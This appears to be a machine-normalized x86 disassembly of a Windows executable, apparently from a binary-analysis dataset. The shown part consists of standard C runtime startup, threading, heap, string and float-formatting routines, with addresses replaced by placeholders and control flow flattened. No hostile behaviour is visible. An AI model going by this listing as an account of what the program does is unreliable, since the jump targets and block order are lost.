mov [ edi ] edx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
sub_403013
push esi
push edi
push 0x74
push 0x1
xor edi edi
call sub_40401d
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
call sub_4033db
test edi edi
pop ecx
je r-xdata
push esi
call sub_403f03
mov eax [ esp + 0x10 ]
pop ecx
push esi
push 0x4
push esi
push sub_40308a
push [ esp + 0x20 ]
mov [ esi + 0x48 ] eax
mov eax [ esp + 0x28 ]
push edi
mov [ esi + 0x4c ] eax
call [ CreateThread@IAT ]
mov edi eax
test edi edi
mov [ esi + 0x4 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
call sub_403e2a
pop ecx
call [ GetLastError@IAT ]
mov edi eax
push edi
call [ ResumeThread@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
retn
mov eax edi
sub_40308a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x48 ]
mov [ esi + 0x48 ] ecx
mov ecx [ eax + 0x4c ]
mov [ esi + 0x4c ] ecx
push eax
call sub_403f7d
pop ecx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x10
call sub_40378f
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
push [ esi + 0x4c ]
call [ esi + 0x48 ]
pop ecx
call sub_403147
call eax
sub_403147
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
call sub_403f16
mov esi eax
test esi esi
jne r-xdata
call eax
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
push 0x10
call sub_40378f
pop ecx
push esi
call sub_403f7d
pop ecx
push 0x0
call [ ExitThread@IAT ]
push eax
call [ CloseHandle@IAT ]
sub_403190
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_4044cd
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_4045b2
mov ebx eax
add esp 0x4
call sub_4045b2
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_40452e
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4032e0
push edi
call sub_403385
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_403397
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_40338e
pop edi
retn
push rw-data
push rw-data
call sub_403397
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_4033b4
push ebp
mov ebp esp
add esp 0xfffffff4
fwait
fnstcw [ ebp - 0x2 ]
fwait
mov ax [ ebp - 0x2 ]
or ah 0xc
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fistp [ ebp - 0xc ]
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
leave
retn
sub_4033db
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_4044cd
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_404897
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push esi
push 0x9
call sub_4044cd
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push esi
call sub_4052fc
add esp 0xc
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_403445
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
push esi
push eax
call sub_4048c2
pop ecx
pop ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_40349d
cmp [ ebp - 0x24 ] 0x0
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
call sub_405353
add esp 0xc
jne r-xdata
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_4034d6
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_403502
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_4056c4
test eax eax
pop ecx
jne r-xdata
sub_403502
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x9
call sub_4044cd
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_404beb
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_403569
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
add eax 0xf
and al 0xf0
push eax
push 0x1
pop eax
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp r-xdata
jmp r-xdata
push esi
jmp r-xdata
push 0x9
call sub_4044cd
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_405398
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4035c8
mov eax [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] esi
cmp esi [ rw-data ]
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
sub_4035fe
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40362b
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
sub_40362b
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x1
call sub_4047f2
pop ecx
test eax eax
jne r-xdata
call sub_403eaf
test eax eax
jne r-xdata
push 0x1c
call sub_4037b4
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_405c55
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_405b23
mov [ rw-data ] eax
call sub_4058d6
call sub_40581d
call sub_403291
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_4057c5
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x10
call sub_4037b4
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_401e00
mov [ ebp - 0x60 ] eax
push eax
call sub_4032be
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_40415a
pop ecx
pop ecx
retn
sub_4037d8
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_405f9d
add esp 0x1c
test eax eax
jne r-xdata
sub_403850
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_403884
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
xor esi esi
push edi
push esi
push esi
push esi
push esi
push [ ebp + 0xc ]
lea eax [ ebp - 0x4 ]
xor edi edi
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_4064d2
mov ebx eax
add esp 0x1c
test bl 0x4
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_40644c
pop ecx
test bl 0x2
pop ecx
jne r-xdata
mov edi 0x200
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edi 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
fld [ ebp - 0xc ]
mov [ eax ] edi
pop edi
fstp [ eax + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn
or edi 0x100
cmp eax 0x2
jne r-xdata
test bl 0x1
jne r-xdata
sub_403910
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40399d
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x8 ]
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
leave
retn
push 0x1
pop eax
leave
retn
sub_4039db
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_40399d
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_403a04
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_404543
cmp eax 0x65
pop ecx
je r-xdata
mov cl [ rw-data ]
mov al [ esi ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rw-data ] 0x1
jle r-xdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
retn
movsx eax [ esi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
movsx eax [ esi ]
push 0x4
push eax
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
test eax eax
jne r-xdata
sub_403a5e
mov eax [ esp + 0x4 ]
mov dl [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
cmp cl dl
je r-xdata
retn
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx eax
cmp cl 0x65
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
cmp [ eax ] dl
jne r-xdata
cmp cl 0x45
je r-xdata
mov dl [ ecx ]
inc eax
inc ecx
test dl dl
mov [ eax ] dl
jne r-xdata
dec eax
inc eax
jmp r-xdata
sub_403ac4
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_4064a5
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_406478
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_403b02
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_406b80
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp + 0xc ]
lea eax [ esi + 0x1 ]
push eax
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add edx eax
add ecx edx
push ecx
call sub_406b09
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
call sub_403b63
mov eax [ ebp + 0xc ]
add esp 0x30
pop esi
leave
retn
sub_403b63
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x18 ] bl
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
cmp [ esi ] 0x2d
mov eax edi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] ebx
setg al
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax edi
push eax
call sub_403e05
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
jle r-xdata
mov [ edi ] 0x2d
lea eax [ edi + 0x1 ]
xor ecx ecx
cmp [ ebp + 0x18 ] bl
push r--data
sete cl
add ecx eax
add ecx [ ebp + 0xc ]
push ecx
call sub_406ca0
cmp [ ebp + 0x10 ] ebx
pop ecx
pop ecx
mov ecx eax
je r-xdata
mov dl [ eax + 0x1 ]
lea ecx [ eax + 0x1 ]
mov [ eax ] dl
mov eax ecx
mov cl [ rw-data ]
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je r-xdata
mov [ ecx ] 0x45
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ esi + 0x4 ]
dec ebx
jns r-xdata
inc ecx
cmp ebx 0x64
jl r-xdata
neg ebx
mov [ ecx ] 0x2d
inc ecx
cmp ebx 0xa
jl r-xdata
mov eax ebx
push 0x64
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
add [ ecx + 0x1 ] bl
mov eax ebx
push 0xa
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
sub_403c25
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_406b80
mov esi [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
add eax esi
push eax
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
add eax [ ebp + 0xc ]
push eax
call sub_406b09
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push esi
push [ ebp + 0xc ]
call sub_403c7a
mov eax [ ebp + 0xc ]
add esp 0x2c
pop esi
leave
retn
sub_403c7a
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
dec eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi ] 0x2d
mov edi ebx
jne r-xdata
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea edi [ ebx + 0x1 ]
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebx
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
add edi eax
push 0x1
push edi
call sub_403e05
pop ecx
mov [ edi ] 0x30
pop ecx
inc edi
jmp r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
push 0x1
push edi
call sub_403e05
mov al [ rw-data ]
pop ecx
mov [ edi ] al
mov esi [ esi + 0x4 ]
inc edi
pop ecx
test esi esi
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
neg esi
cmp [ ebp + 0xc ] esi
jl r-xdata
neg esi
jmp r-xdata
push [ ebp + 0xc ]
push edi
call sub_403e05
push [ ebp + 0xc ]
push 0x30
push edi
call sub_406d90
add esp 0x14
mov [ ebp + 0xc ] esi
sub_403d21
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
lea eax [ ebp - 0x28 ]
push edi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_406b80
mov eax [ ebp - 0xc ]
mov ebx [ ebp + 0x10 ]
lea esi [ eax - 0x1 ]
xor eax eax
cmp [ ebp - 0x10 ] 0x2d
sete al
add eax [ ebp + 0xc ]
mov edi eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
push edi
call sub_406b09
mov eax [ ebp - 0xc ]
add esp 0x1c
dec eax
cmp esi eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
call sub_403b63
add esp 0x14
cmp eax ebx
jge r-xdata
test cl cl
je r-xdata
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push ebx
push [ ebp + 0xc ]
call sub_403c7a
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ edi - 0x2 ] al
sub_403db4
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403b02
cmp [ ebp + 0x10 ] 0x45
je r-xdata
cmp [ ebp + 0x10 ] 0x66
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403d21
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403c25
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_403e05
push edi
mov edi [ esp + 0xc ]
test edi edi
je r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
push esi
call sub_403910
inc eax
push eax
push esi
add esi edi
push esi
call sub_406df0
add esp 0x10
pop esi
sub_403e2a
push esi
call sub_403ea6
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_403e9d
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jb r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_403e9d
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_403e9d
mov [ eax ] 0xd
pop esi
retn
call sub_403e9d
mov [ eax ] 0x8
pop esi
retn
sub_403eaf
push esi
call sub_4044a4
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_40401d
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_403f03
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_403f16
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_40401d
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_40378f
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_403f03
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_403f7d
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_4033db
pop ecx
push 0x0
push [ rw-data ]
call [ TlsSetValue@IAT ]
pop esi
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_4033db
pop ecx
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_4033db
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_4033db
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_4033db
pop ecx
mov eax [ esi + 0x50 ]
cmp eax rw-data
je r-xdata
push eax
call sub_4033db
pop ecx
push esi
call sub_4033db
pop ecx
push eax
call sub_4033db
pop ecx
sub_40401d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
mov [ ebp - 0x1c ] esi
cmp esi 0xffffffe0
ja r-xdata
xor ebx ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
jmp r-xdata
push 0x1
pop esi
mov eax [ ebp - 0x20 ]
cmp [ rw-data ] ebx
je r-xdata
cmp eax 0x2
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp edi [ rw-data ]
ja r-xdata
mov [ ebp - 0x20 ] ebx
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_4056c4
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push 0x9
call sub_4044cd
pop ecx
mov [ ebp - 0x4 ] ebx
push edi
call sub_404beb
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4040b6
cmp [ ebp - 0x20 ] ebx
je r-xdata
jmp r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x20 ] eax
push 0x9
call sub_4044cd
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_405398
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_40413f
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x1c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
push ebx
push [ ebp - 0x20 ]
call sub_406d90
add esp 0xc
sub_40415a
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_403f16
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_404298
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
